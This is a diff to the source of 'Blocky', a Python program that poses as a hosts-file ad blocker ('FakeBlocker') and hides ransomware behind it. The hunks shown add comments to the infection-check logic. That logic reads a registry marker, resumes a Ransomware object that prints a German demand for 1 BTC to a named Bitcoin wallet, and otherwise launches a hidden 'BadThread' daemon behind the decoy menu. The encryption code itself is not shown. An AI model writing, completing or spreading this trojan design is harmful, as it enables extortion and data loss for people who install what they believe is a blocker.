@@ -65,7 +65,7 @@ class FakeBlocker:
                 return True
             else:
                 print(
-                    "Blocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!"
+                    "\nBlocky needs Admin privileges to edit the Hosts-File. Please restart as Admin!\n"
                 )
                 return False
         except Exception as err:
@@ -76,16 +76,18 @@ class FakeBlocker:
         """Checks for existing Registry entries -> Maybe the tool has been here before?"""
         keyName = r"Software\Blocky\Main"
         try:
+            # If key exists, create a Ransomware object without getting the already known system info, and start loop again
             key = winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
             )
             rnsm = Ransomware(resume=True)
             rnsm.victim_id = winreg.QueryValueEx(key, "ID")[0]
             print(
-                "\n Du bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\n Starte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt."
+                "\n Du bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\n Starte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt.\n"
             )
             rnsm.sync_loop()
         except:
+            # Else start a new Ransomware() runthrough as daemon thread, and show Blocky functionality.
             BadThread()
             blocky.show_menu()
 
@@ -98,16 +100,12 @@ class FakeBlocker:
         if selection not in ["1", "2", "3"]:
             self.show_menu()
         elif selection == "1":
-            self.show_hosts()
+            pprint.PrettyPrinter().pprint(self.hosts)
+            self.show_menu()
         elif selection == "2":
             self.add_blocklist()
         elif selection == "3":
             sys.exit()
-
-    def show_hosts(self):
-        """Prints a simple list of all entries in the local Hosts file"""
-        pprint.PrettyPrinter().pprint(self.hosts)
-        self.show_menu()
 
     def add_blocklist(self):
         """After the user selects on of the predefined blocklists, the corresponding entries will the added to the local Hosts file"""
@@ -360,4 +358,6 @@ if __name__ == "__main__":
         main()
     # Start check if system is already infected or not
     blocky.initial_check()
+
+
 
